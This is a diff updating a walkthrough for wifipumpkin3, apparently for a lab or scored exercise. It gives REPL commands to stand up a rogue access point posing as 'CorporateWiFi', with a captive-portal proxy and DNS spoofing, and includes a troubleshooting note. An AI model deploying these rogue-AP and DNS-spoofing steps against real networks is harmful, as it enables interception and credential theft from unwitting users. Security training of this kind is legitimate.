@@ -1,22 +1,23 @@
 # wifipumpkin3 — walkthrough
 
+**Verified against:** wifipumpkin3 1.1.7 as of 2026-Q3
+
 Two paths. Run WP3 standalone against a target from a laptop, or
 lift its templates for use in the Pineapple's evil-portal module.
 
 ## Path A — Standalone rogue
 
 ```
-git clone https://github.com/P0cL4bs/wifipumpkin3
-cd wifipumpkin3
-pip3 install -r requirements.txt
-sudo python3 wp3.py
+# From a released install (PyPI or the repo's setup.py):
+sudo wifipumpkin3
 
-# Inside the WP3 shell:
+# Inside the WP3 REPL — one command per line (no ';' chaining):
 wp3 > set interface wlan1
 wp3 > set ssid CorporateWiFi
-wp3 > set channel 6
 wp3 > set proxy captiveflask
-wp3 > set plugin dns_spoof; on
+wp3 > ignore pumpkinproxy
+wp3 > set plugin dns_spoof
+wp3 > plugins dns_spoof on
 wp3 > start
 ```
 
@@ -73,8 +74,8 @@ request from a scorer bot.
 
 ## Failure modes
 
-- **`wp3.py` errors on hostapd start.** Adapter isn't in a state
-  WP3 accepts. Kill NetworkManager first:
+- **wifipumpkin3 errors on hostapd start.** Adapter isn't in a
+  state WP3 accepts. Kill NetworkManager first:
   `sudo systemctl stop NetworkManager`.
 - **Template doesn't render.** Missing PHP or the plugin isn't
   captiveflask. Check `wp3 > show plugins`.
